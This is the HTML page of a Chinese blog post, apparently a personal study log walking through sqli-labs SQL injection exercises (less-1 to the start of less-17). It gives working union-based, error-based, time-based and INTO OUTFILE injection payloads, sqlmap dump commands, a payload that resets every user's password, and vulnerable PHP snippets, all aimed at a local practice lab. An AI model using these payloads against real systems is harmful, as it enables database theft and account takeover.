@@ -1,0 +1,925 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqli-labs记录 | x4297's blog</title><meta name="author" content="x4297"><meta name="copyright" content="x4297"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录一下sqli-labs相关的练习 具体如何判断注入点和回显点看 less-54  # 2022.4.23 增加一点简单的说明  sqli-labs是一个练习sql注入的靶场，使用php制作，github地址https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs  本文没有配图片，纯文字（全文太长了不想配图，而且写本文的时候插入图片不熟练），搭建好sqli-labs环境后，配合使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs记录">
+<meta property="og:url" content="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="x4297&#39;s blog">
+<meta property="og:description" content="记录一下sqli-labs相关的练习 具体如何判断注入点和回显点看 less-54  # 2022.4.23 增加一点简单的说明  sqli-labs是一个练习sql注入的靶场，使用php制作，github地址https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs  本文没有配图片，纯文字（全文太长了不想配图，而且写本文的时候插入图片不熟练），搭建好sqli-labs环境后，配合使">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://x4297.github.io/img/Yuumi.jpg">
+<meta property="article:published_time" content="2022-01-24T15:07:32.000Z">
+<meta property="article:modified_time" content="2025-02-25T15:01:03.510Z">
+<meta property="article:author" content="x4297">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://x4297.github.io/img/Yuumi.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sqli-labs记录",
+  "url": "https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/",
+  "image": "https://x4297.github.io/img/Yuumi.jpg",
+  "datePublished": "2022-01-24T15:07:32.000Z",
+  "dateModified": "2025-02-25T15:01:03.510Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "x4297",
+      "url": "https://x4297.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqli-labs记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">x4297's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">sqli-labs记录</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">sqli-labs记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-24T15:07:32.000Z" title="发表于 2022-01-24 23:07:32">2022-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-25T15:01:03.510Z" title="更新于 2025-02-25 23:01:03">2025-02-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>记录一下sqli-labs相关的练习</p>
+<p>具体如何判断注入点和回显点看 less-54</p>
+<hr>
+<p># 2022.4.23 增加一点简单的说明</p>
+<ol>
+<li><p>sqli-labs是一个练习sql注入的靶场，使用php制作，github地址<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+</li>
+<li><p>本文没有配图片，纯文字（全文太长了不想配图，而且写本文的时候插入图片不熟练），搭建好sqli-labs环境后，配合使用体验更佳（或者对照sqli-labs的源码）。可以当作备忘录，遇到某种见过的类型但是忘了怎么做，可以看看</p>
+</li>
+</ol>
+<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>靶场搭建在本地虚拟机上，url为 <a target="_blank" rel="noopener" href="http://game.local.com/sqli-labs-master/">http://game.local.com/sqli-labs-master/</a> （仅本地可访问）</p>
+<p>字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://game.local.com/sqli-labs-master/Less-1/?id=&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>因为此网页只显示查询到的第一条记录，所以如果想要回显所有查询到的数据，需要使用 mysql的 <code>group_concat</code> 函数 或者 最后加上 <code>limit 5,1</code> （5换成别的数字，从0开始计数，5表示查看第6条记录）一条一条查看</p>
+<p>正常查询查了三列，所以联合查询也得查三列。三列是通过 order by 是否报错判断出来的。其中2和3 有回显。</p>
+<p>数据库名（security），之后为了更加简洁明了，只给出 url 中的 查询字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+<p>表名 （mysql中才能这么查）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>选择表 users ，查列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>知道有 id，username，password 这3列，一次查出所有数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id, username, password) separator &#x27;..&#x27;),3 from users--+</span><br></pre></td></tr></table></figure>
+
+<p>concat_ws 表示 with separator ，可以指定分隔符，第一个参数就是分隔符</p>
+<p>group_concat 也可以指定分隔符，但是是在最后加上 separator ‘指定的分隔符’</p>
+<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>数字型</p>
+<p>使用谷歌浏览器插件 hackbar，看得比较舒服</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select &#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-3（括号包裹）"><a href="#less-3（括号包裹）" class="headerlink" title="less-3（括号包裹）"></a>less-3（括号包裹）</h1><p>和sql语句构造相关的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>‘’$id’ 用括号包裹，闭合单引号后还要闭合圆括号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>在 less-3 的基础上，把单引号换成了双引号</p>
+<p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-5（报错注入）"><a href="#less-5（报错注入）" class="headerlink" title="less-5（报错注入）"></a>less-5（报错注入）</h1><p>此页面若是查询到数据，则会多显示出一行 <code>You are in...........</code> （不需要sql语句查询到的记录有且仅有一条，可以查询到多条记录），而且会显示sql语句的报错信息。由此想到可以使用布尔盲注或者报错注入。</p>
+<p>盲注比较麻烦，所以先使用报错注入，盲注后面应该有机会用到</p>
+<p>使用的数据库为 mysql 版本为 5.7.26</p>
+<p>给出三个可以用于mysql报错注入的sql语句，payload为user()，使用时换成自己想要的</p>
+<p>报错原因大体为 rand(0) 伪随机序列导致临时表中主键重复，想要深入了解可以网上查一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
+
+<p>以下两个函数 extractvalue 和 updatexml 与 xml 相关，报错原因是xpath语法错误</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>报错注入时，sql语句不能有语法错误。给出一种简单的使用方法，0x7e 表示 ‘~’ （报错信息中，两个波浪线中间的就是 database() ）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>hackbar 中有 updatexml 报错注入的模板</p>
+<p>看了一眼标题，double injection ，我还以为是 二次注入 还是 二次编码</p>
+<p>网上查了一下 double injection ，有人说是因为有两个select所以叫双查询？？？</p>
+<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>同 less-5 单引号换成双引号</p>
+<h1 id="less-7（outfile）"><a href="#less-7（outfile）" class="headerlink" title="less-7（outfile）"></a>less-7（outfile）</h1><p>id&#x3D;1时提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>
+
+<p>id&#x3D;-1时提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
+
+<p>猜测 没查询到数据 以及 sql语句语法错误 都提示 “You have an error in your SQL syntax”</p>
+<p>不显示报错信息所以无法使用报错注入。不过根据 id 的值是否在数据库中，返回不同的页面，所以应该也可以使用布尔盲注，但既然给了提示使用 outfile ，那就先试试 outfile</p>
+<p>使用 outfile 之前，先要修改 mysql 的配置文件 （可以在启动mysql时使用命令行参数，但感觉不是很方便）</p>
+<table>
+<thead>
+<tr>
+<th align="left">secure_file_priv 的值</th>
+<th>解释</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">(NULL)</td>
+<td>我使用的mysql版本默认值为这个，配置文件中没有 secure_file_priv 就为这个值</td>
+<td>不允许使用 outfile</td>
+</tr>
+<tr>
+<td align="left">‘’</td>
+<td>配置文件中直接 secure_file_priv&#x3D;  或者 ‘’ 或者 “” 都是这个</td>
+<td>允许 outfile 将文件导出到任意目录（可能还需要mysql有相关权限吧。使用的是windows系统，不太熟悉windows的权限管理）</td>
+</tr>
+<tr>
+<td align="left">‘c:&#x2F;test’</td>
+<td>一个具体的路径</td>
+<td>只允许将文件导出到指定目录及其子目录</td>
+</tr>
+</tbody></table>
+<p>mysql运行时查询该变量的值，变量名不太记得可以用通配符 ‘%’，运行时无法在mysql中使用set修改该变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导出路径可以是 绝对路径 也可以是 相对路径</p>
+<p>绝对路径没什么好说的，相对路径则和配置文件中的 datadir 有关</p>
+<p>假设 datadir&#x3D;c:&#x2F;home&#x2F;test_of_outfile ，sqli-labs使用的数据库名为 security</p>
+<p>相对路径 ‘test1.txt’ 导出的文件存放在 c:&#x2F;home&#x2F;test_of_outfile&#x2F;security&#x2F;test1.txt</p>
+<p>同样，datadir 也不能使用 set 修改，可以在配置文件中修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，如果修改 datadir 修改后，要将原来datadir中的文件拷贝到新的datadir中，否则mysql无法启动</span><br></pre></td></tr></table></figure>
+
+<p>推荐一款软件，Everything ，可以查找计算机上的文件，还挺快的，一开始不知道相对路径是相对哪，就是拿这个找的</p>
+<p>输出文件要选个可以访问的路径，我放在了网站的根目录下。因为sql语句执行没有返回数据，所以会提示错误，但文件已经导出了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)) union select &#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27; union select 1,2,3 into outfile &#x27;C:/tools/phpstudy_pro/WWW/test111.txt&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>文件内容 16进制表示为（0x0A 是 换行符LF (\n) win7记事本中显示不出来，windows中的换行是CRLF (\r\n) ，0x09 是水平制表符 (\t) ）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61 09 62 09 63 0A 31 09 32 09 33 0A</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试是单引号还是双引号时，可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>有数据的表示不是使用这种引号</p>
+<p>mysql中的字符型和整型比较，有点像php的弱类型比较</p>
+<p>1 &#x3D;&#x3D; ‘1abc’</p>
+<h1 id="less-8（sqlmap-blind）"><a href="#less-8（sqlmap-blind）" class="headerlink" title="less-8（sqlmap blind）"></a>less-8（sqlmap blind）</h1><p>也可以outfile</p>
+<p>标题上面写了盲注</p>
+<p>那就试试sqlmap的布尔盲注吧</p>
+<p>我是用 pip 安装的 sqlmap，发现安装完之后在python的安装目录下的 Scripts 中有一个 sqlmap.exe ，然后这个目录又在环境变量Path中，所以可以直接  <code> sqlmap -u url</code> 而不需要 <code>python sqlmap.py -u</code> 。</p>
+<p>顺便提一嘴，sqlmap.py 中第一行指定了解释器，所以命令行里面可以直接运行 sqlmap.py 而不是作为python的命令行参数。但第一行指定的解释器文件名是 python，如果把 python.exe 改成了 python3.exe，就不能运行了，sqlmap.exe也不能运行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行如下命令，运行过程中会有几个选项，[y&#x2F;N] 代表 y(es) 或 n(o) ，大写表示默认值，大部分情况直接回车使用默认值即可。–technique表示使用什么方法，B表示布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-8/?id=1 --technique=B</span><br></pre></td></tr></table></figure>
+
+<p>运行完一次后会有缓存文件，记录之前的结果，再接着看当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-8/?id=1 --technique=B --current-db</span><br></pre></td></tr></table></figure>
+
+<p>看表名 -D 后面指定数据库名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-8/?id=1 --technique=B -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p>列名 -T 后面指定表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-8/?id=1 --technique=B -D security -T emails --columns</span><br></pre></td></tr></table></figure>
+
+<p>最后，查看emails中的数据，-C 指定列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-8/?id=1 --technique=B -D security -T emails -C id,email_id --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<p>url 可以用双引号包裹，但不能用单引号，我用单引号直接提示我 invalid target URL（运行在windows下的cmd上）</p>
+<p>生成的缓存文件的目录以单引号开头</p>
+<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>不管id为什么，都是一样的界面。尝试基于时间的盲注。这种方法是最耗时间的</p>
+<p>判断单双引号还是整型，if函数 类似三元运算符  (1&#x3D;&#x3D;1) ? sleep(1) : 0</p>
+<p>sql语句若是错误则不会调用sleep函数，响应时间就没那么久</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; or if(1=1,sleep(1),0)--+</span><br></pre></td></tr></table></figure>
+
+<p>虽然是sleep(1)，但响应时间有点小久，不知道是为什么</p>
+<p>sqlmap把–technique&#x3D;B 改为 &#x3D;T ，其他和less-8一样，但是要花比较长的时间，有[Y&#x2F;n]选一下就好，一般默认值就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://game.local.com/sqli-labs-master/Less-9/?id=1 --technique=T --current-db</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>同 less-9 ，单引号改双引号</p>
+<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>http请求方法改为post</p>
+<p>有报错信息</p>
+<p>报错注入，在表单任意一个字段 (Username 或 Password)中填入，表单中 + 不能代表空格，井号也不需要url编码，所以直接用井号注释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>get改为post其实没有什么区别，基本上一样吧，感觉有点水</p>
+<p>分屏写的，浏览器下面一半hackbar，上面一半网页，屏幕太小，没看到登录成功或者失败的信息，我还以为怎么get改post都放在不同的lesson，却直接跳到了报错注入，不从字符型开始水一遍</p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>sqli-labs 前面这些表单都没有检查是否有数据，所以有一个字段直接空着也行。有些和之前使用get时基本一致，所以 开摆！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) or 1=1#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-15（sqlmap-post）"><a href="#less-15（sqlmap-post）" class="headerlink" title="less-15（sqlmap post）"></a>less-15（sqlmap post）</h1><p>盲注</p>
+<p>sqlmap  get 和 post 使用方法不太一样</p>
+<p>常用的方法是 burp suite 抓个包，把http请求保存在一个文件里，然后 <code>-r &quot;&lt;path&gt;&quot;</code> 让sqlmap从文件中读取数据</p>
+<p>但我刚好不太想打开burp suite，所以试试别的方法</p>
+<p>–from参数，自动探测表单，一路狂回车</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://game.local.com/sqli-labs-master/Less-15/&quot; --forms --current-db --technique=T</span><br></pre></td></tr></table></figure>
+
+
+
+<p>–data&#x3D;”<params>“，手动指定参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://game.local.com/sqli-labs-master/Less-15/&quot; --data=&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot; --current-db --technique=T</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sqlmap 布尔盲注成不了，可能是因为登录成功和登录失败最明显的就一个图片的url不一样，相差不大，sqlmap 判断不出来，虽然在浏览器里看得很明显。</p>
+<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>好像就多个括号？</p>
+<p>摆了</p>
+<h1 id="less-17（blind-二次注入）"><a href="#less-17（blind-二次注入）" class="headerlink" title="less-17（blind&amp;二次注入）"></a>less-17（blind&amp;二次注入）</h1><p>注入点变了，看到修改密码觉得有update语句，然后没有token 又不验证旧密码，csrf</p>
+<p>查看源代码，username必须是数据库中已有数据，否则什么信息都不给</p>
+<p>username对了之后就有报错信息，可以报错注入</p>
+<p>new password 如下时可以进行基于时间的盲注。sleep(1) 好像表示暂停10秒，不是一秒，sleep函数太多记混了（后来测试又是1秒？？不知道是什么情况，之前测试sleep(3) 等了半分钟）（之后发现可能和表中有多少列有关）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; where if(1=1,sleep(1),0)#</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注好像不太行，username 有过滤，而username对了之后，只要不报错，显示的页面都一样</p>
+<p>new password值如下时，可修改所有用户的密码，也就是加了个 ‘#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">456&#x27;#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>有个有意思的东西，他直接把数据库中查出来的数据拼接到sql语句中，可以试一下二次注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们手动插入一条数据</p>
